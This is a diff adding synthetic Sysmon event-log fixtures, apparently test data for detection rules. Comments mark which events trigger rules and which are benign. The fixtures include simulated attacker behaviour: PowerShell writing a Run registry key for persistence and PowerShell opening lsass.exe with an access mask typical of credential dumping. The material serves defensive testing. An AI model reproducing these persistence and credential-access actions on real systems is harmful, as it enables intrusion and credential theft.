+      <Data Name="User">WORKSTATION-02\mwilson</Data>
+      <Data Name="Protocol">tcp</Data>
+      <Data Name="Initiated">true</Data>
+      <Data Name="SourceIsIpv6">false</Data>
+      <Data Name="SourceIp">10.0.0.22</Data>
+      <Data Name="SourceHostname">WORKSTATION-02</Data>
+      <Data Name="SourcePort">51234</Data>
+      <Data Name="SourcePortName">-</Data>
+      <Data Name="DestinationIsIpv6">false</Data>
+      <Data Name="DestinationIp">10.0.0.200</Data>
+      <Data Name="DestinationHostname"></Data>
+      <Data Name="DestinationPort">8443</Data>
+      <Data Name="DestinationPortName">-</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 2007: Edge on port 80 — benign HTTP, no rule fires -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>3</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>3</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-04-03T14:30:45.445566700Z"/>
+      <EventRecordID>2007</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION-02</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-04-03 14:30:45.445</Data>
+      <Data Name="ProcessGuid">{22222222-2222-2222-2222-222222222210}</Data>
+      <Data Name="ProcessId">4400</Data>
+      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
+      <Data Name="User">WORKSTATION-02\mwilson</Data>
+      <Data Name="Protocol">tcp</Data>
+      <Data Name="Initiated">true</Data>
+      <Data Name="SourceIsIpv6">false</Data>
+      <Data Name="SourceIp">10.0.0.22</Data>
+      <Data Name="SourceHostname">WORKSTATION-02</Data>
+      <Data Name="SourcePort">52000</Data>
+      <Data Name="SourcePortName">-</Data>
+      <Data Name="DestinationIsIpv6">false</Data>
+      <Data Name="DestinationIp">93.184.216.34</Data>
+      <Data Name="DestinationHostname">example.com</Data>
+      <Data Name="DestinationPort">80</Data>
+      <Data Name="DestinationPortName">http</Data>
+    </EventData>
+  </Event>
+
+  <!-- ================================================================ -->
+  <!-- WORKSTATION-02 — Registry persistence                             -->
+  <!-- ================================================================ -->
+
+  <!-- Event 2008: PowerShell writing Run key — triggers REG-001 -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>13</EventID>
+      <Version>2</Version>
+      <Level>4</Level>
+      <Task>13</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-04-03T14:30:50.667788900Z"/>
+      <EventRecordID>2008</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION-02</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="EventType">SetValue</Data>
+      <Data Name="UtcTime">2026-04-03 14:30:50.667</Data>
+      <Data Name="ProcessGuid">{22222222-2222-2222-2222-222222222202}</Data>
+      <Data Name="ProcessId">3456</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="TargetObject">HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater</Data>
+      <Data Name="Details">C:\Users\mwilson\AppData\Roaming\svcupd.exe</Data>
+      <Data Name="User">WORKSTATION-02\mwilson</Data>
+    </EventData>
+  </Event>
+
+  <!-- ================================================================ -->
+  <!-- WORKSTATION-02 — Process access                                   -->
+  <!-- ================================================================ -->
+
+  <!-- Event 2009: PowerShell opening lsass.exe with 0x1410 mask — triggers PA-001 and PA-002 -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>10</EventID>
+      <Version>3</Version>
+      <Level>4</Level>
+      <Task>10</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-04-03T14:30:58.889900100Z"/>
+      <EventRecordID>2009</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION-02</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-04-03 14:30:58.889</Data>
+      <Data Name="SourceProcessGUID">{22222222-2222-2222-2222-222222222202}</Data>
+      <Data Name="SourceProcessId">3456</Data>
+      <Data Name="SourceThreadId">3800</Data>
+      <Data Name="SourceImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="TargetProcessGUID">{22222222-2222-2222-2222-222222220020}</Data>
+      <Data Name="TargetProcessId">720</Data>
+      <Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data>
+      <Data Name="GrantedAccess">0x1410</Data>
+      <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9d4b4|C:\Windows\System32\KERNELBASE.dll+12e93|UNKNOWN(00007FFB99887766)</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 2010: benign lsass access by antivirus agent — no rule fires (AV in System32) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>10</EventID>
+      <Version>3</Version>
+      <Level>4</Level>
+      <Task>10</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-04-03T14:31:02.001234500Z"/>
+      <EventRecordID>2010</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION-02</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-04-03 14:31:02.001</Data>
+      <Data Name="SourceProcessGUID">{22222222-2222-2222-2222-222222222300}</Data>
+      <Data Name="SourceProcessId">9900</Data>
+      <Data Name="SourceThreadId">9910</Data>
+      <Data Name="SourceImage">C:\Windows\System32\MsMpEng.exe</Data>
+      <Data Name="TargetProcessGUID">{22222222-2222-2222-2222-222222220020}</Data>
+      <Data Name="TargetProcessId">720</Data>
+      <Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data>
+      <Data Name="GrantedAccess">0x1000</Data>
+      <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9d4b4</Data>
     </EventData>
   </Event>
 
